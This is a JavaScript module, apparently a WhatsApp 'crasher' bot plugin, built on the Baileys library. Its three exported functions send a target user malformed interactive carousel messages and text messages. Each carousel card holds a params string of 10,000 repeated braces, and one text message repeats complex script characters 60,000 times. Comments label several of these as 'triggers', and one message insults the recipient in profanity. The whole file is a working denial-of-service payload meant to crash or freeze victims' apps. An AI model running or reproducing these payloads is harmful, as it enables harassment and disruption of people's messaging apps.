const {
default: makeWASocket, 
prepareWAMessageMedia, 
removeAuthState,
useMultiFileAuthState, 
DisconnectReason, 
fetchLatestBaileysVersion, 
makeInMemoryStore, 
generateWAMessageFromContent, 
generateWAMessageContent, 
generateWAMessage,
jidDecode, 
proto, 
delay,
relayWAMessage, 
getContentType, 
generateMessageTag,
getAggregateVotesInPollMessage, 
downloadContentFromMessage, 
fetchLatestWaWebVersion, 
InteractiveMessage, 
makeCacheableSignalKeyStore, 
Browsers, 
generateForwardMessageContent, 
MessageRetryMap
} = require("@whiskeysockets/baileys"); 

const fs = require('fs');
let client

async function carousels2(client, target) {
const cards = [];

const media = await prepareWAMessageMedia(
{ video: { url: "https://files.catbox.moe/1cf232.mp4" } },
{ upload: client.waUploadToServer }
);

const header = {
videoMessage: media.videoMessage,
hasMediaAttachment: false,
contextInfo: {
forwardingScore: 666,
isForwarded: true,
stanzaId: "—ꞰR" + Date.now(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
quotedMessage: {
extendedTextMessage: {
text: "🧬⃟༑⌁⃰𝘼⃬⃑𝙡𝙞⃕𝙥⃬⃕𝙯⃬⃑⃕𝙯⃬⃕𝙮⃕𝘾⃬⃑⃕𝙧⃕𝙖⃬⃕𝙨⃑⃕𝙝⃬⃑⃝𝙚⃑𝙧ཀ͜͡🪅",
contextInfo: {
mentionedJid: ["13135550002@s.whatsapp.net"],
externalAdReply: {
title: "𝘼⃬⃑𝙡𝙞⃕𝙥⃬⃕𝙯⃬⃑⃕𝙯⃬⃕𝙮⃕𝘾⃬⃑⃕𝙧⃕𝙖⃬⃕𝙨⃑⃕𝙝⃬⃑⃝𝙚⃑𝙧ཀ͜͡",
body: "𝘼⃬⃑𝙡𝙞⃕𝙥⃬⃕𝙯⃬⃑⃕𝙯⃬⃕𝙮⃕𝘾⃬⃑⃕𝙧⃕𝙖⃬⃕𝙨⃑⃕𝙝⃬⃑⃝𝙚⃑𝙧ཀ͜͡",
thumbnailUrl: "",
mediaType: 1,
sourceUrl: "https://primrosereyy.nichesite.org",
showAdAttribution: false // trigger 1
}
}
}
}
}
};

for (let r = 0; r < 15; r++) {
cards.push({
header,
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000) // trigger 2
}
});
}

const msg = generateWAMessageFromContent(
target,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: "𝘼⃬⃑𝙡𝙞⃕𝙥⃬⃕𝙯⃬⃑⃕𝙯⃬⃕𝙮⃕𝘾⃬⃑⃕𝙧⃕𝙖⃬⃕𝙨⃑⃕𝙝⃬⃑⃝𝙚⃑𝙧ཀ͜͡"
},
carouselMessage: {
cards,
messageVersion: 1
},
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: "13135550002@s.whatsapp.net"
},
stanzaId: "—ꞰR" + "-Id" + Math.floor(Math.random() * 99999), // trigger 3
forwardingScore: 100,
isForwarded: true,
mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 4
externalAdReply: {
title: "Primrose",
body: "",
thumbnailUrl: "https://primrosereyy.nichesite.org",
mediaType: 1,
mediaUrl: "",
sourceUrl: "https://primrosereyy.nichesite.org",
showAdAttribution: false
}
}
}
}
}
},
{}
);

await client.relayMessage(target, msg.message, {
participant: { jid: target },
messageId: msg.key.id
});
}

async function forceCall(client, target) {
const cards = [];

const media = await prepareWAMessageMedia(
{ video: { url: "https://files.catbox.moe/1cf232.mp4" } },
{ upload: client.waUploadToServer }
);

const header = {
videoMessage: media.videoMessage,
hasMediaAttachment: false,
contextInfo: {
forwardingScore: 666,
isForwarded: true,
stanzaId: "—ꞰR" + Date.now(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
quotedMessage: {
extendedTextMessage: {
text: "🧬⃟༑⌁⃰𝘼⃬⃑𝙡𝙞⃕𝙥⃬⃕𝙯⃬⃑⃕𝙯⃬⃕𝙮⃕𝘾⃬⃑⃕𝙧⃕𝙖⃬⃕𝙨⃑⃕𝙝⃬⃑⃝𝙚⃑𝙧ཀ͜͜͡🪅",
contextInfo: {
mentionedJid: ["13135550002@s.whatsapp.net"],
externalAdReply: {
title: "𝘼⃬⃑𝙡𝙞⃕𝙥⃬⃕𝙯⃬⃑⃕𝙯⃬⃕𝙮⃕𝘾⃬⃑⃕𝙧⃕𝙖⃬⃕𝙨⃑⃕𝙝⃬⃑⃝𝙚⃑𝙧ཀ͜͡",
body: "𝘼⃬⃑𝙡𝙞⃕𝙥⃬⃕𝙯⃬⃑⃕𝙯⃬⃕𝙮⃕𝘾⃬⃑⃕𝙧⃕𝙖⃬⃕𝙨⃑⃕𝙝⃬⃑⃝𝙚⃑𝙧ཀ͜͡",
thumbnailUrl: "",
mediaType: 1,
sourceUrl: "https://primrosereyy.nichesite.org",
showAdAttribution: false // trigger 1
}
}
}
}
}
};

for (let r = 0; r < 15; r++) {
cards.push({
header,
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000) // trigger 2
}
});
}

const msg = generateWAMessageFromContent(
target,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: "Яêy4ŪꞰ🇬🇧"
},
carouselMessage: {
cards,
messageVersion: 1
},
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: "13135550002@s.whatsapp.net"
},
stanzaId: "—ꞰR" + "-Id" + Math.floor(Math.random() * 99999), // trigger 3
forwardingScore: 100,
isForwarded: true,
mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 4
externalAdReply: {
title: "Primrose",
body: "",
thumbnailUrl: "https://primrosereyy.nichesite.org",
mediaType: 1,
mediaUrl: "",
sourceUrl: "https://primrosereyy.nichesite.org",
showAdAttribution: false
}
}
}
}
}
},
{}
);

await client.relayMessage(target, msg.message, {
participant: { jid: target },
messageId: msg.key.id
});
}

async function loadedIos(client, target) {
await client.sendMessage(target, {
text: "🧪‌⃰Ꮡ‌‌" + "⛧ 𝘼⃬⃑𝙡𝙞⃕𝙥⃬⃕𝙯⃬⃑⃕𝙯⃬⃕𝙮⃕𝘾⃬⃑⃕𝙧⃕𝙖⃬⃕𝙨⃑⃕𝙝⃬⃑⃝𝙚⃑𝙧ཀ͜͡ ⛧" + "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
contextInfo: {
externalAdReply: {
title: `⛧ 𝘼⃬⃑𝙡𝙞⃕𝙥⃬⃕𝙯⃬⃑⃕𝙯⃬⃕𝙮⃕𝘾⃬⃑⃕𝙧⃕𝙖⃬⃕𝙨⃑⃕𝙝⃬⃑⃝𝙚⃑𝙧ཀ͜͡⛧`,
body: `—Fuck ${pushname} you.`,
previewType: "PHOTO",
thumbnail: "",
sourceUrl: `https://example.com/x`
}
}
}, { quoted: m })
}

module.exports = { loadedIos, forceCall, carousels2 }
